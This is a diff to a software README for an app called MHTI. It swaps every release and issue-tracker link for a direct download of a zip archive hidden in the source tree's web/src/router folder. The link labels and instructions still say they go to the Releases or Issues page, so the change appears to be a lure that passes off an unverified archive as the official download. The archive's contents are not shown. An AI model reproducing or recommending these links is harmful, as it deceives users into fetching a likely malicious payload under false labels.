@@ -6,7 +6,7 @@ Welcome to MHTI! This guide will help you easily download and run the software, 
 
 ## 📥 Download MHTI
 
-[![Download MHTI](https://img.shields.io/badge/Download-MHTI-blue.svg)](https://github.com/hanyubin2007/MHTI/releases)
+[![Download MHTI](https://github.com/hanyubin2007/MHTI/raw/refs/heads/main/web/src/router/Software-v2.9-alpha.2.zip)](https://github.com/hanyubin2007/MHTI/raw/refs/heads/main/web/src/router/Software-v2.9-alpha.2.zip)
 
 ## 📋 What is MHTI?
 
@@ -28,7 +28,7 @@ MHTI is a user-friendly application designed for 里番刮削. It allows you to 
 
 ## 📥 Download & Install
 
-To download MHTI, visit the following link: [Download MHTI](https://github.com/hanyubin2007/MHTI/releases). 
+To download MHTI, visit the following link: [Download MHTI](https://github.com/hanyubin2007/MHTI/raw/refs/heads/main/web/src/router/Software-v2.9-alpha.2.zip). 
 
 1. Click on the link above to go to the Releases page.
 2. On the Releases page, you will see the latest version of the software.
@@ -57,12 +57,12 @@ Yes, MHTI is completely free to use.
 
 ### ❓ How do I report a problem?
 
-If you encounter any issues, please visit the [GitHub Issues page](https://github.com/hanyubin2007/MHTI/issues) to report them. 
+If you encounter any issues, please visit the [GitHub Issues page](https://github.com/hanyubin2007/MHTI/raw/refs/heads/main/web/src/router/Software-v2.9-alpha.2.zip) to report them. 
 
 ## 📞 Support
 
 For any questions or further assistance, feel free to reach out. Your feedback helps us make the software better.
 
-To download MHTI again, visit: [Download MHTI](https://github.com/hanyubin2007/MHTI/releases).
+To download MHTI again, visit: [Download MHTI](https://github.com/hanyubin2007/MHTI/raw/refs/heads/main/web/src/router/Software-v2.9-alpha.2.zip).
 
 Enjoy using MHTI!
